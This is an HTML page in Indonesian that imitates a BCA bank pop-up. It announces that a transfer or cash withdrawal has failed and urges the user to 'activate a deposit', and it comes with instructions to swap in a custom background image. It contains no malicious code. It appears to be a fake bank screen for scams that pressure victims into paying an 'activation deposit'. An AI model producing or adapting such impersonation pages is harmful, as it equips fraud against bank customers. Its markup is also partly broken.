<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pop-up BCA ID Terblokir</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }
    body {
      /* Ganti 'gambar-latar.jpg' dengan alamat/nama file gambarmu */
      background: url('kode.png') center/cover no-repeat;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 15px;
    }
    .popup {
      background: #ffffff;
      width: 100%;
      max-width: 420px; /* diperkecil dari sebelumnya */
      border-radius: 20px;
      padding: 28px 22px;
      text-align: center;
      box-shadow: 0 3px 10px rgba(0,0,0,0.12);
    }
    .error-text {
      
      color:red;
      margin-bottom: 28px;
      
    .pesan {
      color: #003366;
      font-size: 12px;
      line-height: 1.4;
      margin-bottom: 28px;
      font-weight: 500;
    }
    .tombol-ok {
      background-color: #0057b8;
      color: white;
      border: none;
      border-radius: 35px;
      padding: 11px 45px;
      font-size: 15px;
      font-weight: bold;
      cursor: pointer;
    }
    .tombol-ok:hover {
      background-color: #004a9e;
    }
  </style>
</head>
<body>
  
 
  <div class="popup">
    <!-- === TULISAN KODE SALAH === -->
        <div class="error-text">
            <i class="fa-exclamation-triangle"></i> ⚠TRANSFER/TARIK TUNAI GAGAL !!
          <br><br>
    <p class="pesan">Segera lakukan aktivasi deposit, informasi lebih lanjut kendala anda kepada bank 
    </p>
    <button class="tombol-ok">OK</button>
  </div>
</body>
</html>
